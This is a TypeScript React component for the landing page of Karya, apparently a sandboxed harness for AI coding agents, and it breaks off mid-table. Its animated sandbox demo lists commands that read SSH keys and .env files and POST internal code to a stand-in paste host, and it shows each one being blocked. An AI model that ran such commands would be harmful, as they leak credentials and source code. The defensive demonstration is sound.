"use client";

import React from "react";
import Link from "next/link";
import SiteNav from "./SiteNav";
import SiteFooter from "./SiteFooter";
import Terminal from "./Terminal";
import Mark from "./Mark";

const INSTALL = "curl -fsSL https://usekarya.dev/install | sh";

const SPLITS: Record<string, [string, string]> = {
  "Autonomy without the risk.": ["Autonomy without ", "the risk."],
  "A coding agent that asks first.": ["A coding agent that ", "asks first."],
  "The engineer drives. Karya assists.": ["The engineer drives. ", "Karya assists."],
  "The harness around the model.": ["The harness around ", "the model."],
};
const BIG = ["its own computer", "nothing on your host", "reviewed before it lands", "your keys", "any model"];
const CHAPTERS = ["task", "vm", "run", "fix", "review", "accept", "report"];
const TICKER = ["a microVM per session", "nothing runs on your host", "repo copied in, .env left out", "python · read · shell · write_stdin · jobs", "terminal UI and desktop app", "every turn priced", "OpenAI-compatible providers", "a gate on every request out", "an oracle reviews every diff", "git checkpoint before apply", "Linux with KVM · macOS on Apple silicon", "open source", "pre-1.0"];
const NODES: [string, string, boolean?][] = [
  ["task", "you", true],
  ["model", "picks a tool"],
  ["microVM", "runs it"],
  ["result", "back to the model"],
  ["oracle", "reviews the diff"],
  ["brief", "changes · checks"],
  ["accept", "you", true],
];
const SEQ = [
  { n: 0, it: 1, ms: 2000, c: 0, cap: "you: fix the failing test in internal/meter and make go test pass" },
  { n: 1, it: 1, ms: 1400, c: 0.0034, cap: "model plans and calls shell: go test ./internal/meter" },
  { n: 2, it: 1, ms: 1600, c: 0.0034, cap: "microVM: the test runs on the copy in the workspace inside the VM · exit 1" },
  { n: 3, it: 1, ms: 1200, c: 0.0034, cap: "result: the failure goes back to the model" },
  { n: 1, it: 2, ms: 1300, c: 0.0095, cap: "model fixes sum.go and reruns the tests" },
  { n: 2, it: 2, ms: 1600, c: 0.0095, cap: "microVM: go test ./... · exit 0" },
  { n: 3, it: 2, ms: 1200, c: 0.0129, cap: "result: tests pass · the model proposes the diff" },
  { n: 4, it: 2, ms: 1600, c: 0.02, cap: "oracle: reviews the diff · pass" },
  { n: 5, it: 2, ms: 1800, c: 0.02, cap: "brief: 1 file changed · tests ran and passed · nothing risky flagged" },
  { n: 6, it: 2, ms: 3600, c: 0.02, cap: "you press a: git checkpoint, then the diff is applied" },
];
const ROWS: [string, string, string, string, "d" | "p" | "w"][] = [
  ["host", "your machine", "", "not reachable", "d"],
  ["ssh", "├─ ~/.ssh/", "", "not reachable", "d"],
  ["env", "└─ ~/dev/billing/.env", "", "not copied in", "d"],
  ["ws", "/workspace/", "  copy of the repo", "writable", "w"],
  ["out", "/outputs/", "  docs, charts", "writable", "w"],
  ["proc", "processes", "  shells, Python, servers", "kept running", "p"],
  ["net", "⇢ network", "  through the gate", "checked", "d"],
];
const PATHS: { name: string; tag: string; us?: boolean; rows: string[] }[] = [
  { name: "runs on your host", tag: "the yolo agent", rows: ["your machine", "your whole machine", "wherever the agent runs", "as soon as they're written", "the vendor's"] },
  { name: "asks for everything", tag: "the cautious agent", rows: ["your machine, once you press y", "your whole machine", "wherever the agent runs", "one prompt at a time", "the vendor's"] },
  { name: "runs in their cloud", tag: "the hosted computer", rows: ["their servers only", "their VM, away from your repo", "on their servers", "as a pull request you review", "their choice of models"] },
  { name: "kārya", tag: "a computer of its own", us: true, rows: ["a microVM, local first", "only the VM", "never inside the VM", "after review, with a checkpoint", "any provider, your keys"] },
];
const PATH_ROWS = ["where commands run", "what a bad command can reach", "your API keys", "changes reach your repo", "models"];
const PROVIDERS: [string, string][] = [
  ["openai", "OpenAI"], ["anthropic", "Anthropic"], ["gemini", "Google Gemini"], ["bedrock", "Amazon Bedrock"], ["azure", "Azure OpenAI"], ["vertexai", "Vertex AI"],
  ["mistral", "Mistral"], ["deepseek", "DeepSeek"], ["xai", "xAI"], ["groq", "Groq"], ["openrouter", "OpenRouter"], ["together", "Together AI"],
  ["fireworks", "Fireworks AI"], ["huggingface", "Hugging Face"], ["qwen", "Qwen"], ["ollama", "Ollama"],
];
type Attempt = { cmd: string; res: string; ok: boolean; rows: string[] };
const ATTEMPTS: Attempt[] = [
  { cmd: "$ go test ./...", res: "✓ ran in the VM · writes stay in the workspace inside the VM", ok: true, rows: ["ws"] },
  { cmd: "$ cat ~/.ssh/id_ed25519", res: "✕ not found · the VM has no host folders", ok: false, rows: ["ssh"] },
  { cmd: "$ cat .env", res: "✕ not found · secret files are left out", ok: false, rows: ["env"] },
  { cmd: "$ curl -X POST paste.example -d @internal", res: "✕ blocked · it carries your code to an unknown site", ok: false, rows: ["net"] },
  { cmd: "$ python plot_usage.py", res: "✓ chart saved to /outputs · comes back through review", ok: true, rows: ["out"] },
];

/* shared class lists (the design's repeated style fragments) */
const label = "font-mono text-[13px] text-fg-3";
// section heading; margins are added per use, mobile margins always win
const h2 = "font-serif font-normal text-[clamp(40px,6.2vw,78px)] leading-none tracking-[-0.018em] text-balance mobile:mt-[14px] mobile:mb-[18px] mobile:text-[36px] mobile:leading-[1.05]";
const h2m = "mt-[18px] mb-[22px]";
const lead = "font-serif text-[19px] leading-[1.6] text-pretty text-fg-2 mobile:text-[17px] mobile:leading-[1.55]";
const sectionPad = "mx-auto my-0 max-w-[1100px] px-6 py-[clamp(72px,10vw,128px)] mobile:px-5 mobile:py-14";
const split2 = "grid grid-cols-[repeat(auto-fit,minmax(min(100%,380px),1fr))] items-start gap-x-16 gap-y-12";
const em = "text-accent";
const pill = "border border-line-2 px-[9px] py-[3px] text-fg-2";
const th = "px-4 py-3 font-normal";
const thFirst = "pt-3 pr-4 pb-3 pl-0 font-normal";
const thLast = "pt-3 pr-0 pb-3 pl-4 font-normal";
const thR = `${th} text-right`;
const td = "px-4 py-3";
const tdFirst = "pt-3 pr-4 pb-3 pl-0";
const tdLast = "pt-3 pr-0 pb-3 pl-4";
const tdR = `${td} text-right`;
const cmdBox = "flex max-w-full items-center border border-accent bg-bg-2 font-mono mobile:w-full mobile:gap-[10px] mobile:py-[10px] mobile:pr-[10px] mobile:pl-[14px] mobile:text-[12.5px]";
const cmdCode = "min-w-0 overflow-x-auto whitespace-nowrap mobile:flex-[1_1_auto] mobile:whitespace-normal mobile:[overflow-wrap:anywhere]";
const copyBtn = "flex-none cursor-pointer border border-accent bg-accent text-accent-ink hover:bg-transparent hover:text-accent";
const textLink = "font-mono underline-offset-4 hover:text-accent";

export interface LandingProps {
  headline?: string;
  model?: string;
  animate?: boolean;
}

interface State {
  copied: boolean;
  typed: number;
  cur: boolean;
  chapter: number;
  loopI: number;
  sbLines: { text: string; color: string }[]; // color is a Tailwind text class
  sbActive: Attempt | null;
  ledger: number;
  costT: number;
}

export default class Landing extends React.Component<LandingProps, State> {
  state: State = { copied: false, typed: 0, cur: true, chapter: -1, loopI: 0, sbLines: [], sbActive: null, ledger: 0, costT: 0 };
  rootRef = React.createRef<HTMLDivElement>();
  marqueeRef = React.createRef<HTMLDivElement>();
  marquee2Ref = React.createRef<HTMLDivElement>();
  timers: ReturnType<typeof setTimeout>[] = [];
  alive = false;
  reduced = false;
  blink: ReturnType<typeof setInterval> | undefined;
  raf = 0;
  raf2 = 0;
  io: IntersectionObserver | undefined;
  io2: IntersectionObserver | undefined;
  ct: ReturnType<typeof setTimeout> | undefined;

  t(fn: () => void, ms: number) {
    this.timers.push(setTimeout(() => this.alive && fn(), ms));
  }
  headline() {
    return this.props.headline ?? "Autonomy without the risk.";
  }
  split(): [string, string] {
    const h = this.headline();
    return SPLITS[h] || [h, ""];
  }
  componentDidMount() {
    this.alive = true;
    this.reduced = !!(typeof window.matchMedia === "function" && matchMedia("(prefers-reduced-motion: reduce)").matches);
    this.blink = setInterval(() => this.alive && this.setState((s) => ({ cur: !s.cur })), 530);
    if (this.reduced) {
      this.setState({ typed: 999, loopI: SEQ.length - 1, ledger: 5, costT: 1 });
      return;
    }
    const len = this.headline().length;
    let i = 0;
    const step = () => {
      i++;
      this.setState({ typed: i });
      if (i < len) this.t(step, 45 + Math.random() * 55);
    };
    this.t(step, 350);
    this.runLoop();
    this.runSandbox();
    this.runMarquee();
    this.runMarquee2();
    this.reveal();
  }
  componentWillUnmount() {
    this.alive = false;
    this.timers.forEach(clearTimeout);
    clearInterval(this.blink);
    cancelAnimationFrame(this.raf);
    cancelAnimationFrame(this.raf2);
    this.io && this.io.disconnect();
    this.io2 && this.io2.disconnect();
    clearTimeout(this.ct);
  }
  runLoop() {
    let i = 0;
    const tick = () => {
      this.setState({ loopI: i });
      const ms = SEQ[i].ms;
      i = (i + 1) % SEQ.length;
      this.t(tick, ms);
    };
    tick();
  }
  runSandbox() {
    let a = 0;
    const next = () => {
      const at = ATTEMPTS[a];
      this.setState((s) => ({ sbActive: null, sbLines: [...s.sbLines, { text: at.cmd, color: "text-fg" }].slice(-7) }));
      this.t(() => {
        this.setState((s) => ({ sbActive: at, sbLines: [...s.sbLines, { text: "  " + at.res, color: at.ok ? "text-ok" : "text-no" }].slice(-7) }));
        this.t(() => {
          a = (a + 1) % ATTEMPTS.length;
          next();
        }, 2300);
      }, 900);
    };
    this.t(next, 600);
  }
  runMarquee() {
    let x = 0,
      last = performance.now();
    const f = (now: number) => {
      if (!this.alive) return;
      const el = this.marqueeRef.current;
      if (el) {
        x -= (now - last) * 0.05;
        const half = el.scrollWidth / 2;
        if (half && -x >= half) x += half;
        el.style.transform = "translate3d(" + x + "px,0,0)";
      }
      last = now;
      this.raf = requestAnimationFrame(f);
    };
    this.raf = requestAnimationFrame(f);
  }
  runMarquee2() {
    let x: number | null = null,
      last = performance.now();
    const f = (now: number) => {
      if (!this.alive) return;
      const el = this.marquee2Ref.current;
      if (el) {
        const half = el.scrollWidth / 2;
        if (x === null) x = -half;
        x += (now - last) * 0.06;
        if (half && x >= 0) x -= half;
        el.style.transform = "translate3d(" + x + "px,0,0)";
      }
      last = now;
      this.raf2 = requestAnimationFrame(f);
    };
    this.raf2 = requestAnimationFrame(f);
  }
  reveal() {
    const root = this.rootRef.current;
    if (!root || !window.IntersectionObserver) {
      this.playLedger();
      return;
    }
    this.io = new IntersectionObserver(
      (es) =>
        es.forEach((e) => {
          if (e.isIntersecting) {
            const el = e.target as HTMLElement;
            el.style.opacity = "1";
            el.style.transform = "none";
            this.io!.unobserve(el);
          }
        }),
      { threshold: 0.1, rootMargin: "0px 0px -40px 0px" },
    );
    root.querySelectorAll<HTMLElement>("[data-reveal]").forEach((el) => {
      if (el.getBoundingClientRect().top < window.innerHeight * 0.92) return;
      const sibs = [...el.parentElement!.children].filter((c) => c.hasAttribute("data-reveal"));
      const d = Math.min(Math.max(sibs.indexOf(el), 0), 5) * 90;
      const ease = "cubic-bezier(.2,.7,.2,1)";
      el.style.opacity = "0";
      el.style.transform = "translateY(32px)";
      el.style.transition = "opacity .9s " + ease + " " + d + "ms, transform .9s " + ease + " " + d + "ms";
      this.io!.observe(el);
    });
    const cost = root.querySelector("#cost");
    if (cost) {
      this.io2 = new IntersectionObserver(
        (es) => {
          if (es[0].isIntersecting) {
            this.io2!.disconnect();
            this.playLedger();
          }
        },
        { threshold: 0.3 },
      );
      this.io2.observe(cost);
    }
  }
  playLedger = () => {
    this.setState({ ledger: 0, costT: 0 });
    [1, 2, 3, 4, 5].forEach((n, i) => this.t(() => this.setState({ ledger: n }), 250 + i * 420));
    const t0 = performance.now() + 250,
      D = 2000;
    const f = (now: number) => {
      if (!this.alive) return;
      const p = Math.max(0, Math.min(1, (now - t0) / D));
      this.setState({ costT: p });
      if (p < 1) requestAnimationFrame(f);
    };
    requestAnimationFrame(f);
  };
  copy = () => {
    try {
      navigator.clipboard && navigator.clipboard.writeText(INSTALL).catch(() => {});
    } catch {}
    this.setState({ copied: true });
    clearTimeout(this.ct);
    this.ct = setTimeout(() => this.setState({ copied: false }), 1600);
  };
  onChapter = (i: number) => {
    if (this.alive && i !== this.state.chapter) this.setState({ chapter: i });
  };

  render() {
    const [A, B] = this.split();
    const n = this.state.typed;
    const ch = this.state.chapter;
    const step = SEQ[this.state.loopI];
    const act = this.state.sbActive;
    const e = 1 - Math.pow(1 - this.state.costT, 3);
    const lg = this.state.ledger;
    const model = this.props.model ?? "gpt-oss-120b";
    const termMode = (this.props.animate ?? true) ? "animated" : "final";
    const copyLabel = this.state.copied ? "copied" : "copy";
    const headA = A.slice(0, n);
    const headB = B.slice(0, Math.max(0, n - A.length));
    const chapterLabel = ch >= 0 ? "chapter " + (ch + 1) + "/7 · " + CHAPTERS[ch] : "one task · one microVM · one review";
    const ticker = [...TICKER, ...TICKER];
    // alternate filled italic words with outlined upright ones
    const bigTicker = [...BIG, ...BIG].map((text, i) => ({ text, cls: i % 2 ? "text-bg [-webkit-text-stroke:3px_var(--fg-2)] [paint-order:stroke_fill] not-italic" : "text-fg [-webkit-text-stroke:0] italic" }));
    const rowOp = (k: number) => (lg >= k ? "opacity-100" : "opacity-10");

    return (
      <div ref={this.rootRef} className="min-h-screen overflow-x-hidden bg-bg text-fg">
        <SiteNav active="home" />

        {/* hero */}
        <section className="bg-grid border-b border-line">
          <div className="mx-auto my-0 max-w-[1200px] px-6 pt-[clamp(56px,8vw,104px)] pb-[clamp(56px,7vw,96px)] mobile:px-5 mobile:pt-10 mobile:pb-12">
            <div className="flex flex-wrap items-center gap-x-[14px] gap-y-[10px] font-mono text-[12.5px]">
              <Link href="/roadmap" className="border border-accent px-[10px] py-[3px] text-accent no-underline hover:text-accent">
                in development · see the roadmap →
              </Link>
            </div>
            <h1 className="relative mt-7 mb-9 max-w-[12ch] font-serif text-[clamp(48px,8.4vw,120px)] leading-[0.95] font-normal tracking-[-0.04em] mobile:mt-[22px] mobile:mb-[26px] mobile:text-[44px] mobile:tracking-[-0.035em]">
              <span aria-hidden="true" className="invisible">
                {A}
                <em>{B}</em>&nbsp;
              </span>
              <span className="absolute top-0 right-0 left-0">
                {headA}
                <em className={em}>{headB}</em>
                <span className={`ml-[0.05em] inline-block h-[0.76em] w-[0.07em] bg-accent align-[-0.04em] ${this.state.cur ? "opacity-100" : "opacity-0"}`} />
              </span>
            </h1>
            <p data-reveal className="m-0 max-w-[56ch] font-serif text-[clamp(19px,2.1vw,24px)] leading-[1.5] text-pretty text-fg-2 mobile:text-[17px] mobile:leading-[1.55]">
              Karya is an opinionated engineering harness for AI agents that work on problems with you. Actions run freely inside a protected sandbox by default, so agents can get real work done without asking at every step. Budgets, thinking limits and built-in observability keep you in control.
            </p>
            <div className="mt-10 flex flex-wrap items-center gap-x-7 gap-y-4">
              <div className={`${cmdBox} gap-[14px] py-3 pr-3 pl-[18px] text-[14px]`}>
                <span className="text-accent">$</span>
                <code className={cmdCode}>{INSTALL}</code>
                <button onClick={this.copy} className={`${copyBtn} px-3 py-[5px] text-[12.5px]`}>
                  {copyLabel}
                </button>
              </div>
              <Link href="/docs" className={`${textLink} text-[14px] text-fg`}>
                Read the docs →
              </Link>
            </div>
            <div data-reveal className="mt-[72px] border border-line-2 bg-bg-2 p-[clamp(12px,2.4vw,32px)] mobile:mt-11 mobile:p-[10px]">
              <div className="mb-[22px] flex flex-wrap justify-end gap-x-4 gap-y-[6px] font-mono text-[12px] text-fg-3 mobile:mb-4 mobile:text-[11px]">
                <span>{chapterLabel}</span>
              </div>
              <Terminal mode={termMode} model={model} interactive onChapter={this.onChapter} />
              <div className="mt-[18px] grid grid-cols-[repeat(7,minmax(0,1fr))] gap-[6px] font-mono text-[11.5px] mobile:mt-3 mobile:gap-1 mobile:text-[10px]">
                {CHAPTERS.map((c, i) => (
                  <div key={c} className="flex min-w-0 flex-col gap-[7px]">
                    <div className={`h-[2px] [transition:background_.3s] ${i < ch ? "bg-fg-2" : i === ch ? "bg-accent" : "bg-line-2"}`} />
                    <span className={`overflow-hidden text-ellipsis whitespace-nowrap [transition:color_.3s] ${i === ch ? "text-accent" : i < ch ? "text-fg-2" : "text-fg-3"}`}>{c}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </section>

        {/* ticker */}
        <div className="overflow-hidden bg-fg text-bg">
          <div ref={this.marqueeRef} className="flex w-max will-change-transform">
            {ticker.map((t, i) => (
              <span key={i} className="flex items-center gap-[22px] py-[18px] pr-[22px] pl-0 font-mono text-[15px] whitespace-nowrap">
                <span className="inline-block h-2 w-2 bg-accent" />
                {t}
              </span>
            ))}
          </div>
        </div>
        <div className="overflow-hidden border-b border-line px-0 py-[clamp(20px,3vw,40px)]">
          <div ref={this.marquee2Ref} className="flex w-max will-change-transform">
            {bigTicker.map((t, i) => (
              <span key={i} className={`flex items-center gap-[0.35em] pr-[0.35em] font-serif text-[clamp(64px,10vw,150px)] leading-[1.05] tracking-[-0.04em] whitespace-nowrap ${t.cls}`}>
                {t.text}
                <span className="inline-block h-[0.16em] w-[0.16em] bg-accent" />
              </span>
            ))}
          </div>
        </div>

        {/* the problem */}
        <section id="problem" className="border-b border-line">
          <div className={sectionPad}>
            <div data-reveal className={label}>the problem</div>
            <h2 data-reveal className={`${h2} ${h2m} max-w-[18ch]`}>
              Babysit it, or <em className={em}>hope for the best.</em>
            </h2>
            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Agents either run on your machine, one bad command away from damage, or ask so often that nobody reads the prompts. The ones with a computer of their own live only in a vendor's cloud, on the models they pick, with your keys on their servers. Karya gives the agent its own computer, on your machine first and soon in our cloud too, and makes everything that leaves it pass a check.</p>
            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,240px),1fr))] gap-4">
              {PATHS.map((pth) => (
                <div key={pth.name} data-reveal className={`flex flex-col border ${pth.us ? "border-accent bg-bg-2" : "border-line-2 bg-transparent"}`}>
                  <div className="border-b border-line px-[18px] py-4">
                    <div className={`font-mono text-[12px] ${pth.us ? "text-accent" : "text-fg-3"}`}>{pth.tag}</div>
                    <div className={`mt-1 font-serif text-[26px] leading-[1.2] ${pth.us ? "text-accent italic" : "text-fg not-italic"}`}>{pth.name}</div>
                  </div>
                  {pth.rows.map((v, k) => (
                    <div key={k} className={`flex flex-col gap-[3px] px-[18px] py-3 ${k < pth.rows.length - 1 ? "border-b border-line" : ""}`}>
                      <span className="font-mono text-[11.5px] text-fg-3">{PATH_ROWS[k]}</span>
                      <span className={`font-mono text-[14px] ${pth.us ? "text-ok" : "text-fg-2"}`}>
                        {pth.us ? "✓ " : ""}
                        {v}
                      </span>
                    </div>
                  ))}
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* pillars index */}
        <section className="border-t border-line">
          <div className="mx-auto my-0 grid max-w-[1100px] grid-cols-[repeat(auto-fit,minmax(180px,1fr))] gap-x-7 gap-y-8 px-6 py-12 mobile:gap-x-5 mobile:gap-y-[22px] mobile:px-5 mobile:py-9">
            {[
              ["#vm", "01", "A computer of its own", "Every command runs in the session's microVM, never on your machine."],
              ["#review", "02", "Reviewed before it lands", "Diffs are reviewed, then applied only when you accept."],
              ["#cost", "03", "Cost you can see", "Every turn is priced."],
              ["#secrets", "04", "Your keys stay out", "The VM holds placeholders. A gate checks every request out."],
              ["#models", "05", "Any model, your keys", "OpenAI-compatible today, more providers next."],
            ].map(([href, num, title, sub]) => (
              <a key={href} href={href} className="flex flex-col gap-2 text-fg no-underline">
                <span className="font-mono text-[12.5px] text-fg-3">{num}</span>
                <span className="font-serif text-[21px] leading-[1.2]">{title}</span>
                <span className="font-serif text-[16px] leading-[1.45] text-fg-2">{sub}</span>
              </a>
            ))}
          </div>
        </section>

        {/* the loop */}
        <section id="loop" className="border-t border-line">
          <div className={sectionPad}>
            <div data-reveal className={label}>the loop</div>
            <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>The model works freely. The edges are checked.</h2>
            <p data-reveal className={`${lead} m-0 max-w-[62ch]`}>Karya runs one turn at a time. Each tool call the model asks for runs inside the session's microVM, and the result goes straight back to the model, with no prompt in between. The checks sit at the edges: when the work is done, an oracle reviews the diff, you get a brief, and only your answer applies it.</p>
            <div data-reveal className="mt-14 border border-line-2 p-[clamp(18px,3vw,36px)] mobile:mt-9 mobile:px-[14px] mobile:py-4">
              <div className="mb-7 flex flex-wrap justify-between gap-x-4 gap-y-[6px] font-mono text-[12.5px] text-fg-3">
                <span>
                  iteration {step.it} · step {this.state.loopI + 1} of {SEQ.length}
                </span>
                <span>est. ${step.c.toFixed(4)}</span>
              </div>
              <div className="flex flex-wrap items-start gap-x-0 gap-y-5 font-mono text-[13.5px] mobile:flex-col mobile:gap-0">
                {NODES.map(([lbl, sub, human], i) => {
                  const on = i === step.n,
                    past = i < step.n;
                  const borderStyle = human && !on ? "border-dashed" : "border-solid";
                  const borderColor = on ? (human ? "border-accent" : "border-fg") : human ? "border-accent" : past ? "border-fg-3" : "border-line-2";
                  const bg = on ? (human ? "bg-accent" : "bg-fg") : "bg-transparent";
                  const color = on ? (human ? "text-accent-ink" : "text-bg") : past ? "text-fg" : "text-fg-2";
                  return (
                    <div key={i} className="flex items-start mobile:w-full mobile:flex-col mobile:items-start">
                      <div className="flex flex-col gap-2">
                        <div className={`border px-[14px] py-[10px] whitespace-nowrap [transition:background_.25s,color_.25s,border-color_.25s] ${borderStyle} ${borderColor} ${bg} ${color}`}>{lbl}</div>
                        <div className={`text-[12px] whitespace-nowrap ${human ? "text-accent" : "text-fg-3"}`}>{sub}</div>
                      </div>
                      {i < NODES.length - 1 && (
                        <div className={`p-[10px] [transition:color_.25s] mobile:pt-1 mobile:pr-0 mobile:pb-[6px] mobile:pl-[14px] ${i < step.n ? "text-accent" : "text-fg-3"}`}>
                          <span className="mobile:hidden">→</span>
                          <span className="hidden mobile:inline">↓</span>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
              <div className="mt-7 flex min-h-[1.6em] items-baseline gap-3 border-t border-line pt-4 font-mono text-[14px]">
                <span className="text-accent">›</span>
                <span>{step.cap}</span>
              </div>
            </div>
            <div className="mt-9 flex flex-wrap items-center gap-[10px] border-t border-line pt-5 font-mono text-[12.5px]">
              <span className="mr-2 text-fg-3">you are asked only for</span>
              <span className={pill}>more files or repos</span>
              <span className={pill}>new network writes</span>
              <span className={pill}>real secrets</span>
              <span className={pill}>applying changes</span>
              <span className="ml-auto flex gap-[18px] text-fg-3">
                <span>
                  <span className="mr-[6px] inline-block h-[10px] w-[10px] border border-line-2 align-[-1px]" />
                  automatic
                </span>
                <span>
                  <span className="mr-[6px] inline-block h-[10px] w-[10px] border border-dashed border-accent align-[-1px]" />
                  you
                </span>
              </span>
            </div>
          </div>
        </section>

        {/* real clients */}
        <section id="today" className="border-t border-line">
          <div className={sectionPad}>
            <div data-reveal className={label}>where it runs</div>
            <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>
              Terminal and desktop. <em className={em}>Cloud next.</em>
            </h2>
            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,300px),1fr))] gap-px border border-line bg-line">
              {[
                ["Terminal", "in development", "The full Karya UI in any shell, editor or remote server.", INSTALL, "macOS · Apple silicon\nLinux · with KVM"],
                ["Desktop", "early preview", "The same core in a native window, with the same chat, tools and usage.", "", "beta builds · expect rough edges"],
                ["Cloud", "coming soon", "The same microVM, review and gate, running on our servers instead of your machine.", "", "no hardware needed"],
              ].map(([t, status, d, cmd, plat], i) => (
                <div key={t} data-reveal className="flex min-w-0 flex-col gap-3 bg-bg px-[22px] py-6">
                  <div className="flex items-baseline justify-between gap-3">
                    <div className="font-serif text-[26px] leading-[1.2]">{t}</div>
                    <div className={`flex items-center gap-2 font-mono text-[12px] ${i === 0 ? "text-accent" : "text-fg-3"}`}>
                      {i === 0 ? (
                        <span className="relative inline-flex h-2 w-2">
                          <span className="absolute inline-flex h-full w-full rounded-full bg-[#e8b839] opacity-75 motion-safe:animate-ping" />
                          <span className="relative inline-flex h-2 w-2 rounded-full bg-[#e8b839]" />
                        </span>
                      ) : null}
                      {status}
                    </div>
                  </div>
                  <div className="font-serif text-[16px] leading-[1.5] text-fg-2">{d}</div>
                  {cmd ? (
                    <pre className="m-0 overflow-x-auto border border-accent bg-bg-2 px-3 py-2 font-mono text-[12.5px] leading-[1.6] whitespace-pre">
                      <span className="text-accent">$</span> {cmd}
                    </pre>
                  ) : null}
                  {t === "Desktop" ? (
                    <div className="flex flex-wrap gap-2">
                      {["macOS", "Linux"].map((os) => (
                        <button key={os} type="button" disabled title="coming soon" className="inline-flex cursor-not-allowed items-center gap-2 border border-line-2 bg-bg-2 px-3 py-2 font-mono text-[12.5px] text-fg-3 opacity-70">
                          <span>↓</span> Download beta · {os}
                        </button>
                      ))}
                    </div>
                  ) : null}
                  <div className="mt-auto pt-2 font-mono text-[12px] leading-[1.7] whitespace-pre-line text-fg-3">{plat}</div>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* 01 vm */}
        <section id="vm" className="border-t border-line">
          <div className={`${sectionPad} ${split2}`}>
            <div>
              <div data-reveal className={label}>01 · a computer of its own</div>
              <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                Its own computer. <em className={em}>Not yours.</em>
              </h2>
              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Every session starts a microVM and copies your repo into the workspace inside the VM, leaving out sensitive files. The agent can install what it needs, keep a Python session alive and leave servers running. None of it touches your machine.</p>
              <p data-reveal className={`${lead} mt-0 mb-7 max-w-[52ch]`}>There are no live shared folders. More files or another repo come in only when you approve.</p>
            </div>
            <div data-reveal className="flex min-w-0 flex-col gap-3 font-mono text-[12.5px] leading-[1.7]">
              <div className="border border-line-2 bg-term">
                <div className="flex flex-wrap justify-between gap-x-4 gap-y-1 border-b border-line px-[14px] py-2 text-fg-3">
                  <span>microVM · session 7f3a2c</span>
                </div>
                <div className="overflow-x-auto overflow-y-hidden px-[14px] py-3">
                  {ROWS.map(([id, path, note, status, kind]) => {
                    const hit = !!(act && act.rows.includes(id));
                    const bg = hit ? (act!.ok ? "bg-ok-bg" : "bg-no-bg") : "bg-transparent";
                    const color = hit ? (act!.ok ? "text-ok" : "text-no") : kind === "w" ? "text-fg" : kind === "p" ? "text-fg-2" : "text-fg-3";
                    return (
                      <div key={id} className={`-mx-[6px] my-0 flex justify-between gap-3 px-[6px] py-0 whitespace-pre [transition:background_.3s,color_.3s] ${bg} ${color}`}>
                        <span>
                          {path}
                          <span className="opacity-70">{note}</span>
                        </span>
                        <span className={kind === "w" || hit ? "font-semibold" : "font-normal"}>{hit ? (act!.ok ? "✓ " : "✕ ") + status : status}</span>
                      </div>
                    );
                  })}
                </div>
                <div className="flex h-[11.9em] flex-col justify-end overflow-hidden border-t border-line px-[14px] py-3">
                  {this.state.sbLines.map((l, i) => (
                    <div key={i} className={`whitespace-pre-wrap [word-break:break-word] ${l.color}`}>
                      {l.text}
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* 02 review */}
        <section id="review" className="border-t border-line">
          <div className={`${sectionPad} ${split2}`}>
            <div>
              <div data-reveal className={label}>02 · reviewed before it lands</div>
              <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                Nothing lands <em className={em}>unreviewed.</em>
              </h2>
              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>The agent never writes to your repo. Its work comes back as a proposal: the diff against your repo, plus the docs and charts it made. An oracle, a second agent, reviews it first, and the coding agent and the oracle keep working on it together until they both agree on the solution.</p>
              <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Only then does it reach you: one final change, already agreed on, waiting for your approval.</p>
            </div>
            <pre data-reveal className="m-0 min-w-0 overflow-x-auto border border-line-2 bg-term px-4 py-[14px] font-mono text-[13px] leading-[1.75] text-fg-2">
              <span className="text-fg-3">brief · proposal 2 · session 7f3a2c{"\n"}</span>
              {"changed   internal/meter/sum.go  +1 −1\nmade      /outputs/usage-histogram.png\nchecks    go test ./...  "}
              <span className="text-ok">passed in the VM{"\n"}</span>
              {"flagged   nothing risky\noracle    "}
              <span className="text-ok">pass</span>
              {" · filter now runs before the sum\n\n"}
              <span className="text-accent">›</span>
              <span className="text-fg"> a{"\n"}</span>
              <span className="text-ok">✓ checkpoint 3f9a1c · diff applied to ~/dev/billing</span>
            </pre>
          </div>
        </section>

        {/* 03 cost */}
        <section id="cost" className="border-t border-line">
          <div className={sectionPad}>
            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,380px),1fr))] items-end gap-x-16 gap-y-8">
              <div>
                <div data-reveal className={label}>03 · cost you can see</div>
                <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                  Every turn, <em className={em}>priced.</em>
                </h2>
                <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Each turn shows its tokens and cost.</p>
              </div>
              <div className="flex flex-col gap-[6px]">
                <div className="font-serif text-[clamp(64px,9.5vw,150px)] leading-[0.9] font-normal tracking-[-0.04em] whitespace-nowrap tabular-nums mobile:text-[56px]">{this.state.costT >= 1 ? "$0.02" : "$" + (0.02 * e).toFixed(4)}</div>
                <div className="flex flex-wrap items-center gap-x-4 gap-y-2 font-mono text-[13px] text-fg-3">
                  <span>estimated cost of the task above · 4 turns · 41s</span>
                  <button onClick={this.playLedger} className="cursor-pointer border border-line-2 bg-transparent px-[10px] py-[3px] text-fg-2 hover:border-accent hover:text-accent">
                    replay
                  </button>
                </div>
              </div>
            </div>
            <div data-reveal className="mt-14 overflow-x-auto overflow-y-hidden border-t border-fg-3">
              <table className="w-full border-collapse font-mono text-[13px] whitespace-nowrap">
                <thead>
                  <tr className="text-left text-fg-3">
                    <th className={thFirst}>turn</th>
                    <th className={th}>model</th>
                    <th className={thR}>in</th>
                    <th className={thR}>out</th>
                    <th className={thR}>cost</th>
                    <th className={thR}>duration</th>
                    <th className={th}>tool</th>
                    <th className={thLast}>outcome</th>
                  </tr>
                </thead>
                <tbody>
                  {(
                    [
